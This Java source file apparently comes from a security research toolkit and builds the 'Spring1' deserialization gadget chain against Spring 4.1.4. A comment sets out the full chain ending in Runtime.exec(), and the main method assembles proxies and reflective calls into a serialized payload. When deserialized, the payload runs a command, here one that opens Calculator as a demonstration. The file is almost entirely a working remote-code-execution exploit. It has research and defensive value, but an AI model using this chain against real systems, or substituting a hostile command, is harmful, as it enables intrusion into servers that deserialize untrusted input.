package com.p2hm1n.gadget;

import com.p2hm1n.annotation.Dependencies;
import com.p2hm1n.util.Gadgets;
import com.p2hm1n.util.PayloadRunner;
import javax.xml.transform.Templates;

import com.p2hm1n.util.Reflections;
import org.springframework.beans.factory.ObjectFactory;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Type;

import static java.lang.Class.forName;

/**
 * Spring1 的 gadget
 *
 * Gadget chain:
 * 		ObjectInputStream.readObject()
 * 			SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()
 * 				SerializableTypeWrapper.TypeProvider(Proxy).getType()
 * 					AnnotationInvocationHandler.invoke()
 * 						HashMap.get()
 * 				ReflectionUtils.findMethod()
 * 				SerializableTypeWrapper.TypeProvider(Proxy).getType()
 * 					AnnotationInvocationHandler.invoke()
 * 						HashMap.get()
 * 				ReflectionUtils.invokeMethod()
 * 					Method.invoke()
 * 						Templates(Proxy).newTransformer()
 * 							AutowireUtils.ObjectFactoryDelegatingInvocationHandler.invoke()
 * 								ObjectFactory(Proxy).getObject()
 * 									AnnotationInvocationHandler.invoke()
 * 										HashMap.get()
 * 								Method.invoke()
 * 									TemplatesImpl.newTransformer()
 * 										TemplatesImpl.getTransletInstance()
 * 											TemplatesImpl.defineTransletClasses()
 * 												TemplatesImpl.TransletClassLoader.defineClass()
 * 													Pwner*(Javassist-generated).<static init>
 * 														Runtime.exec()
 */
@Dependencies({"org.springframework:spring-core:4.1.4.RELEASE","org.springframework:spring-beans:4.1.4.RELEASE"})
public class Spring1 {
    public static void main(String[] args) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl("open -a Calculator");

        final ObjectFactory objectFactoryProxy =
                Gadgets.createMemoitizedProxy(Gadgets.createMap("getObject", templates), ObjectFactory.class);

        final Type typeTemplatesProxy = Gadgets.createProxy((InvocationHandler)
                Reflections.getFirstCtor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler")
                        .newInstance(objectFactoryProxy), Type.class, Templates.class);

        final Object typeProviderProxy = Gadgets.createMemoitizedProxy(
                Gadgets.createMap("getType", typeTemplatesProxy),
                forName("org.springframework.core.SerializableTypeWrapper$TypeProvider"));

        final Constructor mitpCtor = Reflections.getFirstCtor("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
        final Object mitp = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod("getClass", new Class[] {}), 0);
        Reflections.setFieldValue(mitp, "methodName", "newTransformer");

        PayloadRunner.run(mitp);
    }
}
